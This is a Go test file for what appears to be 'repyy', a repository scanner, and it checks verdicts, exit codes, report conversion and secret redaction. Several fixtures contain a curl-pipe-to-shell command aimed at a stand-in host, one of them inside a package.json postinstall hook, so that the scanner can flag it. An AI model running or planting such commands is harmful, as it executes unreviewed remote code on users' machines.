package app

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/Kevin-Umali/repyy/internal/intel"
	"github.com/Kevin-Umali/repyy/internal/model"
	"github.com/Kevin-Umali/repyy/internal/output"
	"github.com/Kevin-Umali/repyy/internal/sandbox"
	"github.com/Kevin-Umali/repyy/internal/scan"
)

func TestMultipleTargetsAndFlagsAfterTargets(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	clean, risky := t.TempDir(), t.TempDir()
	if err := os.WriteFile(filepath.Join(clean, "main.go"), []byte("package main\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"README.md", "LICENSE"} {
		if err := os.WriteFile(filepath.Join(clean, name), []byte("fixture\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(risky, "setup.sh"), []byte("curl https://evil.invalid/p | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	var stdout, stderr bytes.Buffer
	code, err := Run([]string{"scan", clean, risky, "--format", "json", "--jobs", "2"}, &stdout, &stderr, "test")
	if err != nil {
		t.Fatal(err)
	}
	if code != 1 {
		t.Fatalf("exit = %d, want 1; output=%s", code, stdout.String())
	}
	var report model.Report
	if err := json.Unmarshal(stdout.Bytes(), &report); err != nil {
		t.Fatal(err)
	}
	if len(report.Results) != 2 {
		t.Fatalf("got %d results", len(report.Results))
	}
	if report.RulesVersion == "" || report.Intelligence.Version == "" || report.Intelligence.Source != "embedded" {
		t.Fatalf("missing scan provenance: %+v", report)
	}
	if report.Results[0].Verdict != model.VerdictNoFindings {
		t.Fatalf("clean verdict: %s", report.Results[0].Verdict)
	}
	if report.Results[1].Verdict != model.VerdictDoNotRun {
		t.Fatalf("risky verdict: %s", report.Results[1].Verdict)
	}
}

func TestOperationalFailureWinsExitCode(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	var stdout, stderr bytes.Buffer
	code, err := Run([]string{"scan", "/path/that/does/not/exist", "--format=json"}, &stdout, &stderr, "test")
	if err != nil {
		t.Fatal(err)
	}
	if code != 2 {
		t.Fatalf("exit = %d, want 2", code)
	}
}

func TestIncompleteCoverageReturnsOperationalFailure(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	incomplete, clean := t.TempDir(), t.TempDir()
	for _, name := range []string{"first.txt", "second.txt", "third.txt", "fourth.txt"} {
		if err := os.WriteFile(filepath.Join(incomplete, name), []byte("fixture\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	for _, name := range []string{"README.md", "LICENSE"} {
		if err := os.WriteFile(filepath.Join(clean, name), []byte("fixture\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	var stdout bytes.Buffer
	code, err := Run([]string{"scan", incomplete, clean, "--max-files", "3", "--format=json", "--progress=quiet"}, &stdout, &bytes.Buffer{}, "test")
	if err != nil || code != 2 {
		t.Fatalf("code=%d err=%v output=%s", code, err, stdout.String())
	}

	var report model.Report
	if err := json.Unmarshal(stdout.Bytes(), &report); err != nil {
		t.Fatal(err)
	}
	if len(report.Results) != 2 || report.Results[0].Verdict != model.VerdictIncomplete || report.Results[0].Coverage.Complete || report.Results[1].Verdict != model.VerdictNoFindings {
		t.Fatalf("unexpected results: %+v", report.Results)
	}
}

func TestUndecodableScriptExitsIncomplete(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "run.sh"), []byte("#!/bin/sh\n#\x00\ncurl https://evil.invalid/p | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	var stdout bytes.Buffer
	code, err := Run([]string{"scan", root, "--format=json", "--progress=quiet"}, &stdout, &bytes.Buffer{}, "test")
	if err != nil || code != 2 {
		t.Fatalf("code=%d err=%v output=%s", code, err, stdout.String())
	}
	var report model.Report
	if err := json.Unmarshal(stdout.Bytes(), &report); err != nil {
		t.Fatal(err)
	}
	if len(report.Results) != 1 || report.Results[0].Verdict != model.VerdictIncomplete || report.Results[0].Coverage.Complete {
		t.Fatalf("undecodable script appeared clean: %+v", report.Results)
	}
}

func TestDirectorySymlinkKeepsRequestedNameAndFindings(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(`{"scripts":{"postinstall":"curl https://evil.invalid/p | sh"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(t.TempDir(), "review")
	if err := os.Symlink(root, link); err != nil {
		t.Skipf("directory symlink unavailable: %v", err)
	}
	var stdout bytes.Buffer
	code, err := Run([]string{"scan", link, "--format=json", "--progress=quiet"}, &stdout, &bytes.Buffer{}, "test")
	if err != nil || code != 1 {
		t.Fatalf("code=%d err=%v output=%s", code, err, stdout.String())
	}
	var report model.Report
	if err := json.Unmarshal(stdout.Bytes(), &report); err != nil {
		t.Fatal(err)
	}
	if len(report.Results) != 1 || report.Results[0].Target != link || report.Results[0].Coverage.FilesScanned == 0 || len(report.Results[0].Findings) == 0 {
		t.Fatalf("symlink target lost scan findings: %+v", report.Results)
	}
}

func TestScanProgressFollowsOutputFormat(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	target := t.TempDir()
	if err := os.WriteFile(filepath.Join(target, "main.go"), []byte("package main\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		name, format string
		wantProgress bool
	}{
		{"terminal", "terminal", true},
		{"machine-readable", "json", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var stdout, stderr bytes.Buffer
			code, err := Run([]string{"scan", target, "--format", tc.format}, &stdout, &stderr, "test")
			if err != nil || code != 0 {
				t.Fatalf("code=%d err=%v", code, err)
			}
			progress := stderr.String()
			if tc.wantProgress {
				if !strings.Contains(progress, "repyy: scanning ") || !strings.Contains(progress, "repyy: scanned ") {
					t.Fatalf("missing scan progress on stderr: %q", progress)
				}
			} else if progress != "" {
				t.Fatalf("machine-readable scan wrote progress to stderr: %q", progress)
			}
		})
	}
}

func TestScanProgressUpdateIncludesWorkCompleted(t *testing.T) {
	var stderr bytes.Buffer
	progress := &scanProgress{w: &stderr, mode: "plain", active: map[int]*scanProgressState{}}
	progress.start(0, "fixture")
	progress.update(0, 12, 1536)
	progress.printUpdates()
	if !strings.Contains(stderr.String(), "12 files, 1.5 KiB") {
		t.Fatalf("missing progress counters: %q", stderr.String())
	}
}

func TestInteractiveProgressCompactsConcurrentTargets(t *testing.T) {
	var stderr bytes.Buffer
	progress := &scanProgress{w: &stderr, mode: "interactive", active: map[int]*scanProgressState{}}
	progress.start(0, "one")
	progress.start(1, "two")
	if !strings.Contains(stderr.String(), "scanning 2 repositories") {
		t.Fatalf("missing compact concurrent progress: %q", stderr.String())
	}
}

func TestColorModeHonorsNoColor(t *testing.T) {
	if resolveColorMode("auto", true, true) {
		t.Fatal("auto color ignored NO_COLOR")
	}
	if !resolveColorMode("auto", true, false) || resolveColorMode("auto", false, false) {
		t.Fatal("auto color did not follow terminal state")
	}
	if !resolveColorMode("always", false, true) {
		t.Fatal("explicit always should override automatic color policy")
	}
}

func TestDisplayTargetRemovesURLSecrets(t *testing.T) {
	for _, tc := range []struct{ input, want string }{
		{"https://user:secret@example.com/repo.git", "https://[REDACTED]@example.com/repo.git"},
		{"https://example.com/repo.git?token=secret#fragment", "https://example.com/repo.git"},
	} {
		if got := displayTarget(tc.input); got != tc.want {
			t.Errorf("displayTarget(%q) = %q, want %q", tc.input, got, tc.want)
		}
	}
}

func TestRulesListJSONIncludesProvenance(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	var stdout bytes.Buffer
	code, err := Run([]string{"rules", "list", "--format", "json"}, &stdout, &bytes.Buffer{}, "test")
	if err != nil || code != 0 {
		t.Fatalf("code=%d err=%v", code, err)
	}
	var result struct {
		Packages []struct {
			Source      string   `json:"source"`
			SourceURL   string   `json:"source_url"`
			Description string   `json:"description"`
			Affected    []string `json:"affected_versions"`
		} `json:"packages"`
	}
	if err := json.Unmarshal(stdout.Bytes(), &result); err != nil {
		t.Fatal(err)
	}
	if len(result.Packages) == 0 || result.Packages[0].Source == "" || result.Packages[0].SourceURL == "" || result.Packages[0].Description == "" {
		t.Fatalf("missing provenance: %#v", result.Packages)
	}
}

func TestIntelStatusAndExportAreOffline(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	for _, args := range [][]string{{"intel", "status", "--format", "json"}, {"intel", "export"}} {
		var stdout bytes.Buffer
		code, err := Run(args, &stdout, &bytes.Buffer{}, "test")
		if err != nil || code != 0 {
			t.Fatalf("%v: code=%d err=%v", args, code, err)
		}
		if !json.Valid(stdout.Bytes()) {
			t.Fatalf("%v returned invalid JSON: %s", args, stdout.String())
		}
	}
}

func TestReportConvertsLegacyJSONToSelfContainedHTML(t *testing.T) {
	report := model.Report{
		SchemaVersion: "1", ToolVersion: "test", RulesVersion: "test-rules",
		Intelligence: model.IntelligenceInfo{Version: "test-intel", Date: "2026-09-12", Source: "embedded"},
		Results:      []model.RepoResult{{Target: "fixture", Verdict: model.VerdictReview, Coverage: model.Coverage{Complete: true}, Findings: []model.Finding{{RuleID: "EXEC-001", Category: "dynamic-execution", Severity: model.SeverityHigh, Confidence: model.ConfidenceMedium, Context: "executable", Path: "main.js", Line: 3, Occurrences: 1, Message: "Dynamic code execution primitive", Evidence: "eval(value)", Fingerprint: "sha256:test"}}}},
	}
	data, err := json.Marshal(report)
	if err != nil {
		t.Fatal(err)
	}
	root := t.TempDir()
	input, result := filepath.Join(root, "report.json"), filepath.Join(root, "report.html")
	if err := os.WriteFile(input, data, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(result, []byte("old report"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(result, 0o644); err != nil {
		t.Fatal(err)
	}
	code, err := Run([]string{"report", input, "--output", result}, &bytes.Buffer{}, &bytes.Buffer{}, "test")
	if err != nil || code != 1 {
		t.Fatalf("code=%d err=%v", code, err)
	}
	html, err := os.ReadFile(result)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(html), "Content-Security-Policy") || !strings.Contains(string(html), "main.js:3") {
		t.Fatalf("unexpected HTML report: %s", html)
	}
	if runtime.GOOS != "windows" {
		info, err := os.Stat(result)
		if err != nil {
			t.Fatal(err)
		}
		if info.Mode().Perm() != 0o600 {
			t.Fatalf("report mode = %o, want 600", info.Mode().Perm())
		}
	}
}

func TestReportRejectsForgedVerdictAndPreservesExitPolicy(t *testing.T) {
	report := model.Report{SchemaVersion: "1", Results: []model.RepoResult{{
		Target: "fixture", Verdict: model.VerdictNoFindings, Coverage: model.Coverage{Complete: true},
		Findings: []model.Finding{{RuleID: "TEST-001", Path: "main.js", Severity: model.SeverityHigh, Confidence: model.ConfidenceHigh, Message: "danger"}},
	}}}
	path := filepath.Join(t.TempDir(), "report.json")
	run := func() (int, error, string) {
		t.Helper()
		data, err := json.Marshal(report)
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, data, 0o600); err != nil {
			t.Fatal(err)
		}
		var output bytes.Buffer
		code, err := Run([]string{"report", path, "--format", "terminal", "--color", "never"}, &output, &bytes.Buffer{}, "test")
		return code, err, output.String()
	}
	if code, err, output := run(); code != 3 || err == nil || !strings.Contains(err.Error(), "verdict") || output != "" {
		t.Fatalf("forged clean verdict: code=%d err=%v output=%q", code, err, output)
	}
	report.Results[0].Verdict = model.VerdictReview
	if code, err, output := run(); code != 1 || err != nil || !strings.Contains(output, "REVIEW REQUIRED") {
		t.Fatalf("high finding: code=%d err=%v output=%q", code, err, output)
	}
	report.Results[0].Coverage.Complete = false
	report.Results[0].Verdict = model.VerdictIncomplete
	if code, err, output := run(); code != 2 || err != nil || !strings.Contains(output, "SCAN INCOMPLETE") {
		t.Fatalf("incomplete report: code=%d err=%v output=%q", code, err, output)
	}
}

func TestReportConversionRedactsSourceDerivedMessage(t *testing.T) {
	token := "ghp_" + strings.Repeat("A", 36)
	report := model.Report{
		SchemaVersion: "1", ToolVersion: "test", RulesVersion: "test-rules",
		Intelligence: model.IntelligenceInfo{Version: "test-intel", Date: "2026-09-12", Source: "embedded"},
		Results: []model.RepoResult{{Target: "fixture", Verdict: model.VerdictReview, Coverage: model.Coverage{Complete: true},
			Findings: []model.Finding{{RuleID: "PKG-007", Category: "package-script", Severity: model.SeverityHigh, Confidence: model.ConfidenceMedium, Context: "manifest-hook", Path: "package.json", Message: "Suspicious script: " + token, Evidence: "redacted", Fingerprint: "sha256:test"}}}},
	}
	data, err := json.Marshal(report)
	if err != nil {
		t.Fatal(err)
	}
	input := filepath.Join(t.TempDir(), "scan.json")
	if err := os.WriteFile(input, data, 0o600); err != nil {
		t.Fatal(err)
	}
	for _, format := range []string{"html", "sarif", "terminal"} {
		var stdout bytes.Buffer
		code, err := Run([]string{"report", input, "--format", format}, &stdout, &bytes.Buffer{}, "test")
		if err != nil || code != 1 || strings.Contains(stdout.String(), token) || !strings.Contains(stdout.String(), "REDACTED") {
			t.Fatalf("%s conversion leaked source text: code=%d err=%v output=%s", format, code, err, stdout.String())
		}
	}
}

func TestReportOutputPreservesExistingFileOnRenderFailure(t *testing.T) {
	path := filepath.Join(t.TempDir(), "report.html")
	if err := os.WriteFile(path, []byte("previous report"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := writeReportOutput(&bytes.Buffer{}, path, "unsupported", model.Report{}, output.DefaultOptions()); err == nil {
		t.Fatal("expected render failure")
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if string(data) != "previous report" {
		t.Fatalf("existing report changed: %q", data)
	}
}

func TestDockerScanKeepsSuccessfulTargetsAfterAnotherFails(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("fake Docker shell script requires Unix")
	}
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	root := t.TempDir()
	good, bad := filepath.Join(root, "good"), filepath.Join(root, "bad")
	for _, path := range []string{good, bad} {
		if err := os.Mkdir(path, 0o700); err != nil {
			t.Fatal(err)
		}
	}
	worker := model.Report{
		SchemaVersion: "1", ToolVersion: "test", RulesVersion: scan.BuiltinRulesVersion,
		Intelligence: model.IntelligenceInfo{Version: intel.SnapshotVersion, Date: intel.SnapshotDate, Source: "embedded"},
		Results:      []model.RepoResult{{Target: "/input", Verdict: model.VerdictNoFindings, Coverage: model.Coverage{Complete: true}}},
	}
	workerJSON, err := json.Marshal(worker)
	if err != nil {
		t.Fatal(err)
	}
	dockerDir := t.TempDir()
	workerFile := filepath.Join(dockerDir, "worker.json")
	if err := os.WriteFile(workerFile, workerJSON, 0o600); err != nil {
		t.Fatal(err)
	}
	script := "#!/bin/sh\ncase \"$*\" in\n  *'image inspect'*) exit 0 ;;\n  *'/bad,'*) exit 125 ;;\n  *) cat \"$FAKE_DOCKER_WORKER\"; exit 0 ;;\nesac\n"
	if err := os.WriteFile(filepath.Join(dockerDir, "docker"), []byte(script), 0o700); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", dockerDir+string(os.PathListSeparator)+os.Getenv("PATH"))
	t.Setenv("FAKE_DOCKER_WORKER", workerFile)
	oldDigest := sandbox.ImageDigest
	sandbox.ImageDigest = "sha256:" + strings.Repeat("a", 64)
	defer func() { sandbox.ImageDigest = oldDigest }()
	var stdout, stderr bytes.Buffer
	code, err := Run([]string{"scan", good, bad, "--sandbox=docker", "--format=json", "--progress=quiet"}, &stdout, &stderr, "test")
	if err != nil || code != 2 {
		t.Fatalf("code=%d err=%v output=%s", code, err, stdout.String())
	}
	var report model.Report
	if err := json.Unmarshal(stdout.Bytes(), &report); err != nil {
		t.Fatal(err)
	}
	if len(report.Results) != 2 || report.Results[0].Target != good || report.Results[1].Target != bad ||
		report.Results[0].Verdict != model.VerdictNoFindings || report.Results[0].Isolation == nil ||
		report.Results[1].Verdict != model.VerdictIncomplete || report.Results[1].Error == "" {
		t.Fatalf("mixed scan results: %+v", report.Results)
	}
}

func TestScanCanRenderHTMLDirectly(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "README.md"), []byte("fixture\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "LICENSE"), []byte("fixture\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	var stdout bytes.Buffer
	code, err := Run([]string{"scan", root, "--format", "html", "--progress", "quiet"}, &stdout, &bytes.Buffer{}, "test")
	if err != nil || code != 0 {
		t.Fatalf("code=%d err=%v", code, err)
	}
	if !strings.Contains(stdout.String(), "<!doctype html>") || !strings.Contains(stdout.String(), "Content-Security-Policy") {
		t.Fatalf("unexpected HTML scan output: %s", stdout.String())
	}
}

func TestReportRejectsInvalidInput(t *testing.T) {
	root := t.TempDir()
	unsupported := filepath.Join(root, "unsupported.json")
	if err := os.WriteFile(unsupported, []byte(`{"schema_version":"2"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if code, err := Run([]string{"report", unsupported}, &bytes.Buffer{}, &bytes.Buffer{}, "test"); code != 3 || err == nil || !strings.Contains(err.Error(), "unsupported report schema") {
		t.Fatalf("unsupported schema: code=%d err=%v", code, err)
	}
	malformed := filepath.Join(root, "malformed.json")
	if err := os.WriteFile(malformed, []byte(`{"schema_version":`), 0o600); err != nil {
		t.Fatal(err)
	}
	if code, err := Run([]string{"report", malformed}, &bytes.Buffer{}, &bytes.Buffer{}, "test"); code != 3 || err == nil || !strings.Contains(err.Error(), "invalid report JSON") {
		t.Fatalf("malformed input: code=%d err=%v", code, err)
	}
	oversized := filepath.Join(root, "oversized.json")
	file, err := os.Create(oversized)
	if err != nil {
		t.Fatal(err)
	}
	if err := file.Truncate(maxReportInputBytes + 1); err != nil {
		file.Close()
		t.Fatal(err)
	}
	if err := file.Close(); err != nil {
		t.Fatal(err)
	}
	if code, err := Run([]string{"report", oversized}, &bytes.Buffer{}, &bytes.Buffer{}, "test"); code != 3 || err == nil || !strings.Contains(err.Error(), "exceeds 64 MiB") {
		t.Fatalf("oversized input: code=%d err=%v", code, err)
	}
}

func TestReportConversionReappliesLocationLimits(t *testing.T) {
	locations := make([]model.Location, model.MaxLocationsPerFinding+2)
	for index := range locations {
		locations[index] = model.Location{Path: "main.js", StartLine: index + 1, Evidence: "eval(value)"}
	}
	report := model.Report{SchemaVersion: "1", Results: []model.RepoResult{{
		Target: "fixture", Verdict: model.VerdictReview, Coverage: model.Coverage{Complete: true},
		Findings: []model.Finding{{RuleID: "EXEC-001", Category: "dynamic-execution", Severity: model.SeverityHigh, Confidence: model.ConfidenceMedium, Context: "executable", Path: "main.js", Occurrences: len(locations), Message: "dynamic execution", Locations: locations}},
	}}}
	if err := normalizeAndValidateReport(&report); err != nil {
		t.Fatal(err)
	}
	finding := report.Results[0].Findings[0]
	if len(finding.Locations) != model.MaxLocationsPerFinding || finding.LocationsOmitted != 2 || finding.Occurrences != model.MaxLocationsPerFinding+2 || !report.Results[0].Coverage.Complete || len(report.Results[0].Coverage.Warnings) == 0 {
		t.Fatalf("unexpected normalized report: %+v coverage=%+v", finding, report.Results[0].Coverage)
	}
}

func TestRulesExplainSupportsTerminalAndJSON(t *testing.T) {
	for _, format := range []string{"terminal", "json"} {
		var stdout bytes.Buffer
		args := []string{"rules", "explain", "EXEC-001", "--format", format}
		code, err := Run(args, &stdout, &bytes.Buffer{}, "test")
		if err != nil || code != 0 {
			t.Fatalf("%s: code=%d err=%v", format, code, err)
		}
		if !strings.Contains(stdout.String(), "dynamic-execution") {
			t.Fatalf("%s explanation missing metadata: %s", format, stdout.String())
		}
		if !strings.Contains(stdout.String(), "applicable_paths") && !strings.Contains(stdout.String(), "paths:") {
			t.Fatalf("%s explanation missing applicable paths: %s", format, stdout.String())
		}
	}
}

func TestDisplayFiltersDoNotChangeScanExitCode(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "payload.sh"), []byte("curl https://evil.invalid/p | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	var stdout bytes.Buffer
	code, err := Run([]string{"scan", root, "--detail", "summary", "--min-severity", "critical", "--min-confidence", "high", "--progress", "quiet"}, &stdout, &bytes.Buffer{}, "test")
	if err != nil || code != 1 {
		t.Fatalf("code=%d err=%v output=%s", code, err, stdout.String())
	}
}
